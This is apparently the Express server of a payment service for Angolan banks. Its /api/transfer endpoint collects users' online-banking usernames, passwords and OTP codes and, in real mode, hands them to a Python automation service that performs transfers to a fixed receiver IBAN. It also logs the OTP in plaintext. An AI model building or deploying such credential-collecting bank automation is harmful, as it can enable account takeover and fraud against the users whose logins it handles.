const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { PythonAutomationService } = require('./services/pythonAutomation');
const { angolanBanks } = require('./data/banks');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;
const DEMO_MODE = process.env.DEMO_MODE === 'true';
const REAL_TRANSACTIONS = process.env.REAL_TRANSACTIONS === 'true';

// Middleware
app.use(cors({
  origin: ['http://localhost:5173', 'http://localhost:3000', 'http://127.0.0.1:5173',  'http://16.171.135.2:3000', 'https://pay.redmarket-on.com'],
  credentials: true
}));
app.use(express.json());

// In-memory storage for demo (use database in production)
const RECEIVER_IBAN = 'AO06000600000100037131174'; // Banco Atlântico demo IBAN

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Bank Transfer API is running',
    timestamp: new Date().toISOString()
  });
});

// Routes
app.get('/api/receiver-iban', (req, res) => {
  console.log('📞 Receiver IBAN requested');
  res.json({ iban: RECEIVER_IBAN });
});

app.post('/api/transfer', async (req, res) => {
  console.log('🏦 Transfer request received:', {
    bankId: req.body.bankId,
    username: req.body.username ? '[PROVIDED]' : '[MISSING]',
    password: req.body.password ? '[PROVIDED]' : '[MISSING]',
    otpCode: req.body.otpCode ? '[PROVIDED]' : '[MISSING]',
    sessionId: req.body.sessionId || '[NONE]',
    amount: req.body.amount,
    receiverIban: req.body.receiverIban
  });

  try {
    const { bankId, username, password, receiverIban, amount, description, otpCode, sessionId } = req.body;

    // Validate request
    if (!bankId || !username || !password || !receiverIban || !amount) {
      console.log('❌ Validation failed - missing required fields');
      return res.status(400).json({
        success: false,
        message: 'Dados de transferência incompletos',
        timestamp: new Date().toISOString(),
      });
    }

    // Find bank configuration
    const bank = angolanBanks.find(b => b.id === bankId);
    if (!bank) {
      console.log('❌ Bank not found:', bankId);
      return res.status(400).json({
        success: false,
        message: 'Banco não suportado',
        timestamp: new Date().toISOString(),
      });
    }

    console.log(`✅ Processing transfer for ${bank.name}`);

    if (DEMO_MODE) {
      // Demo mode - simulate the process
      console.log('🎭 Running in DEMO mode');
      
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      if (!otpCode) {
        const result = {
          success: false,
          requiresOtp: true,
          sessionId: `DEMO_${Date.now()}`,
          otpMessage: `Código de verificação enviado para o seu telemóvel registado no ${bank.name}`,
          message: 'Verificação OTP necessária',
          timestamp: new Date().toISOString()
        };
        
        console.log('🔐 OTP required for demo transfer');
        return res.json(result);
      }
      
      if (otpCode) {
        console.log('🔐 Processing OTP verification:', otpCode);
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
      
      const result = {
        success: true,
        transactionId: generateTransactionId(),
        message: 'Transferência realizada com sucesso (DEMO)',
        timestamp: new Date().toISOString(),
        details: {
          amount: amount,
          receiverIban: receiverIban,
          fee: calculateFee(amount),
          bankName: bank.name
        }
      };

      console.log('✅ Demo transfer completed:', result.transactionId);
      res.json(result);
      
    } else if (REAL_TRANSACTIONS) {
      // Real transaction mode - use Python automation
      console.log('🏦 Running REAL transaction mode');
      
      const automationService = new PythonAutomationService();
      
      let result;
      
      // Check if this is an OTP submission
      if (otpCode && sessionId) {
        console.log('🔐 Processing OTP submission for session:', sessionId);
        result = await automationService.submitOtp(sessionId, otpCode);
      } else {
        // Initial transfer request
        result = await automationService.performTransfer(req.body, bank);
      }
      
      console.log('🔄 Real automation result:', result);
      res.json(result);
      
    } else {
      // Safety fallback
      res.status(400).json({
        success: false,
        message: 'Sistema não configurado. Configure DEMO_MODE ou REAL_TRANSACTIONS.',
        timestamp: new Date().toISOString(),
      });
    }

  } catch (error) {
    console.error('❌ Transfer processing error:', error);
    res.status(500).json({
      success: false,
      message: 'Erro interno do servidor',
      timestamp: new Date().toISOString(),
    });
  }
});

app.get('/api/banks', (req, res) => {
  console.log('📞 Banks list requested');
  res.json(angolanBanks);
});

// Helper functions
function generateTransactionId() {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 8).toUpperCase();
  return `TXN${timestamp}${random}`;
}

function calculateFee(amount) {
  const feePercentage = 0.005; // 0.5%
  const calculatedFee = amount * feePercentage;
  const minimumFee = 500; // 500 AOA minimum
  const maximumFee = 5000; // 5000 AOA maximum
  return Math.min(Math.max(calculatedFee, minimumFee), maximumFee);
}

app.listen(PORT, () => {
  console.log(`🚀 Bank Transfer API running on port ${PORT}`);
  console.log(`📱 Frontend should connect to: http://localhost:${PORT}`);
  console.log(`🔗 Health check: http://localhost:${PORT}/api/health`);
  console.log(`📋 Available endpoints:`);
  console.log(`   GET  /api/health`);
  console.log(`   GET  /api/receiver-iban`);
  console.log(`   GET  /api/banks`);
  console.log(`   POST /api/transfer`);
});